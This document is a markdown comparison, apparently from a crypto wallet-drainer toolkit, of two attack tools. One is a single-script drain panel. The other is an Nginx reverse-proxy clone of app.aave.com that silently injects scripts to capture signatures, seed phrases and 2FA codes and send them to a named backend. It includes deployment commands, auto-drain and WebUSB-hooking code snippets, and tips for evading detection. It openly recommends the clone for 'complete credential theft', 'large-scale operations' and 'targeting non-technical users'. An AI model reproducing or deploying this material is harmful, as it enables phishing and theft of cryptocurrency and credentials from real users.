# 🔄 COMPARISON: Legion-One-Script vs Clone Perfect Engine

## Overview

| Aspect | Legion-One-Script (Surge Test) | Clone Perfect Engine |
|--------|--------------------------------|----------------------|
| **Type** | Standalone wallet panel | Full website cloning system |
| **Deployment** | Single HTML file + JS (Static) | Docker + Nginx (Full stack) |
| **Complexity** | Simple (1 file) | Complex (100+ components) |
| **Target** | Direct wallet extraction | Credential capture via fake sites |
| **Lines of Code** | ~2000 lines (JS only) | ~13,000+ lines (TS) |

---

## 1️⃣ ARCHITECTURE COMPARISON

### Legion-One-Script Architecture
```
surge.sh/index.html
    └── <script src="legion-one-script.js">
        ├── Inject panel UI (52px button + modal)
        ├── Detect wallets (8 chains)
        ├── Connect to wallets
        ├── Send to backend API
        └── Auto-drain triggered
```

**Advantages:**
- ✅ Lightweight (1 file)
- ✅ No server needed
- ✅ Fast loading
- ✅ Easy to embed anywhere
- ✅ Works on any website

**Disadvantages:**
- ❌ Obvious UI panel (users see it)
- ❌ No site cloning (no cover story)
- ❌ Direct wallet targeting
- ❌ Easy to detect

---

### Clone Perfect Engine Architecture
```
localhost:8083 (Docker container)
    └── Nginx reverse proxy
        ├── Proxies to real site
        ├── Injects 4 scripts:
        │   ├── legion-loader.js
        │   ├── legion-statsig-mock.js
        │   ├── legion-cloak-client.js
        │   └── legion-authorized-drain.js
        ├── Hides all UI
        ├── Monitors API calls
        └── Silent credential extraction
```

**Advantages:**
- ✅ Perfect site replica (users trust it)
- ✅ Scripts hidden in page (invisible)
- ✅ 100% match to real site
- ✅ Captures in natural workflow
- ✅ Multi-page support

**Disadvantages:**
- ❌ Requires server/VPS
- ❌ Docker setup needed
- ❌ More complex
- ❌ Nginx configuration

---

## 2️⃣ WALLET SUPPORT COMPARISON

### Legion-One-Script (8 Chains)
```javascript
✅ EVM
   - MetaMask
   - Rabby
   - WalletConnect (300+ wallets)

✅ Solana
   - Phantom
   - Solflare

✅ TRON
   - TronLink

✅ TON
   - Tonkeeper

✅ Bitcoin
   - UniSat
   - Xverse

✅ Cosmos
   - Keplr

✅ Aptos
   - Petra

✅ Sui
   - Sui Wallet
```

### Clone Perfect Engine (Multi-chain RPC)
```javascript
✅ EVM
   - 23+ networks (Ethereum, Polygon, Arbitrum, Base, etc.)
   - MetaMask, Coinbase, Trust, Rabby

✅ Solana
   - Phantom, Solflare

✅ TRON
   - TronLink

✅ TON
   - Tonkeeper

✅ Bitcoin
   - Native + SegWit
   - UniSat, Xverse

✅ WalletConnect
   - 300+ wallets

✅ Hardware Wallets
   - Ledger (WebUSB)
   - Trezor (WebHID)
```

**Difference:**
- Legion-One: Direct panel, wallets connect to panel
- Clone: Wallets connect to fake site, scripts intercept in background

---

## 3️⃣ CREDENTIAL EXTRACTION METHOD

### Legion-One-Script Flow
```
1. User clicks ⬡ button
2. Panel opens (visible to user)
3. User selects chain
4. User clicks "Connect Wallet"
5. Wallet popup appears
6. User confirms connection
7. Panel shows balance
8. User clicks "Drain" or auto-drain triggered
9. Backend receives: address + signatures
10. User's wallet drained

⚠️ Issue: User SEES the panel!
```

**Code snippet:**
```javascript
// User sees this button
<button id="legion-one-launcher">⬡</button>

// Wallet connection
wallets.evm = await window.ethereum.request({
  method: 'eth_requestAccounts'
});

// Auto drain
if (AUTO_DRAIN) {
  drainAsync(); // Starts immediately
}
```

---

### Clone Perfect Engine Flow
```
1. User visits fake site (looks real)
2. Legion scripts inject silently
3. User navigates normally
4. All API calls intercepted
5. User connects wallet normally
6. Scripts monitor ALL interactions
7. User signs transactions naturally
8. Scripts capture signatures
9. USB/Bluetooth comms monitored
10. User has NO IDEA

✅ Advantage: Completely invisible!
```

**Code snippet (from legion-authorized-drain.js):**
```javascript
// Hook WebUSB silently
function hookWebUSB() {
  var originalRequestDevice = navigator.usb.requestDevice;
  navigator.usb.requestDevice = async function(filters) {
    var device = await originalRequestDevice.call(navigator.usb, filters);
    recordEvent('webusb_device_connected', { filters: filters });
    hookDeviceTransfer(device); // Monitor USB data
    return device;
  };
}

// Intercept wallet signatures
recordEvent('signature', { chain: chain, method: method });
// Signature captured before sent to blockchain
```

---

## 4️⃣ DATA FLOW COMPARISON

### Legion-One-Script Data Flow
```
┌─────────────────────────────────────────┐
│ User's Wallet (MetaMask, Phantom, etc)  │
└────────────────┬────────────────────────┘
                 │
                 │ User clicks "Connect"
                 ↓
┌─────────────────────────────────────────┐
│ Legion-One-Script Panel                  │
│ (Visible in bottom-right corner)        │
│                                         │
│ [Select Chain] [Connect] [Drain]        │
└────────────────┬────────────────────────┘
                 │
                 │ Gets address + signs txs
                 ↓
┌─────────────────────────────────────────┐
│ Backend API                              │
│ sadrailala-production.up.railway.app      │
│                                         │
│ Receives:                               │
│ - Wallet address                        │
│ - Signatures                            │
│ - Balance info                          │
│ - Auto-drains funds                     │
└─────────────────────────────────────────┘
```

---

### Clone Perfect Engine Data Flow
```
┌──────────────────────────────────┐
│ Real Website URL                  │
│ app.aave.com                      │
└──────────────┬───────────────────┘
               │
               │ User visits
               ↓
┌──────────────────────────────────┐
│ Nginx Reverse Proxy               │
│ (localhost:8083)                  │
│                                  │
│ ✅ Injects 4 legion scripts      │
│ ✅ Proxies all requests          │
│ ✅ Rewrites links                │
│ ✅ Handles Cloudflare            │
└──────────────┬───────────────────┘
               │
               │ Page loads perfectly
               ↓
┌──────────────────────────────────┐
│ User's Browser (Sees Real Site)   │
│                                  │
│ Scripts run invisibly:            │
│ - Detect wallets                  │
│ - Monitor signatures              │
│ - Intercept API calls             │
│ - Capture credentials             │
└──────────────┬───────────────────┘
               │
               │ User connects wallet normally
               │ Signs transactions naturally
               │ Has no idea they're being
               │ monitored
               ↓
┌──────────────────────────────────┐
│ Backend API                        │
│ sadrailala-production.up.railway.app │
│                                  │
│ Receives:                         │
│ - Private key captures            │
│ - Seed phrases                    │
│ - Signatures with TX data         │
│ - 2FA codes                       │
│ - ALL credentials                 │
│ - Silent drains funds             │
└──────────────────────────────────┘
```

---

## 5️⃣ SETUP & DEPLOYMENT

### Legion-One-Script
```bash
# 1. Create HTML file
vim index.html
# Add: <script src="./legion-one-script.js"></script>

# 2. Deploy to Surge
surge ./

# 3. Access
https://your-site.surge.sh

# Total time: 2 minutes
# Cost: Free (surge.sh)
```

**Files needed:**
- index.html (small)
- legion-one-script.js (2KB)

---

### Clone Perfect Engine
```bash
# 1. Generate clone
npx ts-node scripts/lib/generators/clone-perfect-engine.ts \
  --target https://app.aave.com \
  --enterprise true

# 2. Navigate to clone
cd clones/aave-clone

# 3. Start Docker
docker-compose up -d

# 4. Access
http://localhost:8083

# Total time: 10-30 minutes
# Cost: VPS ($3-10/month)
```

**Files needed:**
- docker-compose.yml
- nginx.conf (400+ lines)
- All site files (HTML/CSS/JS)
- 4 legion scripts

---

## 6️⃣ DETECTION & SECURITY

### Legion-One-Script Detection
```
🔴 EASY TO DETECT:
- Visible panel in UI
- User sees it clicking
- Network requests to backend obvious
- Panel CSS + JS injected
- Very obvious on inspection
```

### Clone Perfect Engine Detection
```
🟡 HARDER TO DETECT:
- Looks exactly like real site
- No UI changes visible
- Scripts minified/hidden
- API calls look normal (proxied)
- Only detectable via:
  - Deep code inspection
  - Network monitoring (proxy detection)
  - Finding vault addresses hardcoded
  - Comparing with real site code
```

---

## 7️⃣ USE CASES

### Legion-One-Script Best For:
```
✅ Red team testing
✅ Authorized security labs
✅ Pen testing with permission
✅ Quick tests on multiple chains
✅ No pretense needed
✅ User is aware (authorized)
```

### Clone Perfect Engine Best For:
```
✅ Social engineering
✅ Credential harvesting
✅ Large-scale attacks
✅ Looks authentic
✅ User has NO idea
✅ Complete credential theft
```

---

## 📊 FEATURE COMPARISON TABLE

| Feature | Legion-One | Clone Tool |
|---------|-----------|-----------|
| **Setup Time** | 5 min | 30 min |
| **Server Required** | No | Yes (VPS) |
| **Visual UI** | Visible | Hidden |
| **Detectable** | Very | Moderate |
| **Chains Supported** | 8 | 8+ |
| **Credentials Captured** | Signatures only | All (keys, phrases, 2FA) |
| **Multi-page** | No | Yes |
| **Hardware Wallets** | Basic | Full (WebUSB/HID) |
| **Sophistication** | Simple | Advanced |
| **Real Site Look** | No | Perfect copy |
| **Auto-drain** | Yes | Yes |
| **Cost** | Free | $3-10/month |

---

## 🎯 SUMMARY

### Legion-One-Script
**What it is:** Direct wallet panel for authorized testing
**How it works:** User clicks panel, connects wallet, gets drained
**Advantage:** Simple, fast, easy to deploy
**Disadvantage:** Obvious, visible, easy to detect

### Clone Perfect Engine
**What it is:** Complete fake website cloning system
**How it works:** User visits fake site, scripts capture everything silently
**Advantage:** Invisible, authentic, captures all credentials
**Disadvantage:** Complex, needs server, time to set up

---

## 🔗 WHEN TO USE WHAT

Use **Legion-One** if:
- ✅ Authorized red team test
- ✅ Need quick proof of concept
- ✅ Testing specific wallet
- ✅ Don't need authenticity

Use **Clone Tool** if:
- ✅ Need complete credential theft
- ✅ Want undetectable attack
- ✅ Need full site functionality
- ✅ Targeting non-technical users
- ✅ Large-scale operations

---

**TL;DR:**
- **Legion-One** = Simple visible panel (obvious but fast)
- **Clone Tool** = Perfect fake site (invisible but complex)
- Both work, different approaches to same goal
- Clone Tool is more sophisticated and effective
